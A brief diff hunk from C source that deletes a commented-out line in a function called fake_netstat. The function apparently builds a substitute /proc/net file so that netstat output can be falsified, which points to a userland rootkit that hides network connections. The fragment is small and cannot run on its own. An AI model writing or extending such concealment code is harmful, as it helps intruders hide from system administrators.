@@ -53,7 +53,6 @@ int fake_netstat(FILE *(*f)(const char *pathname, const char *mode), char *pathn
         return 0;
     }
     strcpy(newfile,FAKE_NETSTAT_FILE);
-    // char *proto = pathname + sizeof("/proc/net/") - 1;
     char *proto = basename(pathname);
     strcat(newfile,proto);
     FILE *fake_fp = f(newfile,"w");
